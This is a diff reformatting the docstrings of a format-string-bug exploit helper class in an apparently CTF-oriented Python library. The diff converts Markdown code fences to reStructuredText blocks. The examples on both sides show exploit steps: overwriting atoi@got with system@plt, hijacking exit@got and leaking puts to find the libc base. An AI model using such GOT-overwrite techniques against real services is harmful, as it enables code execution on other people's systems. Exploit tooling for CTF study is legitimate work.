@@ -33,22 +33,20 @@ class FSB:
                        or the address of the format string is not aligned.
 
     Examples:
-        ```
-        # Overwrite atoi@got with system@plt
-        fsb = FSB(position=10, bits=32)
-        fsb.write(elf.got('atoi'), p64(elf.plt('system')), size=2)
-        sock.sendline(fsb.payload)
-        ```
+        .. code-block:: python
 
-        ```
-        # Partially overwrite exit@got and leak puts@libc
-        fsb = FSB(6)
-        fsb.write(elf.got('exit'), p8(elf.symbol('_start')))
-        fsb.print('LEAK=')
-        fsb.read(elf.got('puts'))
-        sock.sendline(fsb.payload)
-        libc.base = u64(sock.recvlineafter('LEAK=')[:6]) - libc.symbol('puts')
-        ```
+            # Overwrite atoi@got with system@plt
+            fsb = FSB(position=10, bits=32)
+            fsb.write(elf.got('atoi'), p64(elf.plt('system')), block_size=2)
+            sock.sendline(fsb.payload)
+
+            # Partially overwrite exit@got and leak puts@libc
+            fsb = FSB(6)
+            fsb.write(elf.got('exit'), p8(elf.symbol('_start')))
+            fsb.print('LEAK=')
+            fsb.read(elf.got('puts'))
+            sock.sendline(fsb.payload)
+            libc.base = u64(sock.recvlineafter('LEAK=')[:6]) - libc.symbol('puts')
     """
     WRITE_PREFIX = {1: 'hhn', 2: 'hn', 4: 'n'}
 
@@ -101,19 +99,17 @@ class FSB:
                                         Must be either 1 (%hhn), 2 (%hn), or 4 (%n).
 
         Examples:
-            ```
-            fsb = FSB(position=10)
-            fsb.write(elf.got('atoi'), p64(elf.plt('system')), block_size=2)
-            sock.sendline(fsb.payload)
-            ```
+            .. code-block:: python
 
-            ```
-            fsb = FSB(6)
-            fsb.print(b"AAA")
-            fsb.write(elf.got('exit'), p8(elf.symbol('_start') & 0xff))
-            fsb.read(elf.got('puts'))
-            sock.sendline(fsb.payload)
-            ```
+                fsb = FSB(position=10)
+                fsb.write(elf.got('atoi'), p64(elf.plt('system')), block_size=2)
+                sock.sendline(fsb.payload)
+
+                fsb = FSB(6)
+                fsb.print(b"AAA")
+                fsb.write(elf.got('exit'), p8(elf.symbol('_start') & 0xff))
+                fsb.read(elf.got('puts'))
+                sock.sendline(fsb.payload)
         """
         assert block_size in [1, 2, 4], "`block_size` must be either 1, 2, or 4"
 
@@ -130,14 +126,14 @@ class FSB:
             data (str or bytes): The data to print.
 
         Examples:
-            ```
-            fsb = FSB(6)
-            fsb.read(elf.got('atoi'))
-            fsb.print("XXX")
-            fsb.read(elf.got('system'))
-            fsb.print("XXX")
-            fsb.read(elf.got('abc'))
-            ```
+            .. code-block:: python
+
+                fsb = FSB(6)
+                fsb.read(elf.got('atoi'))
+                fsb.print("XXX")
+                fsb.read(elf.got('system'))
+                fsb.print("XXX")
+                fsb.read(elf.got('abc'))
         """
         data = str2bytes(data)
         if b'\x00' in data:
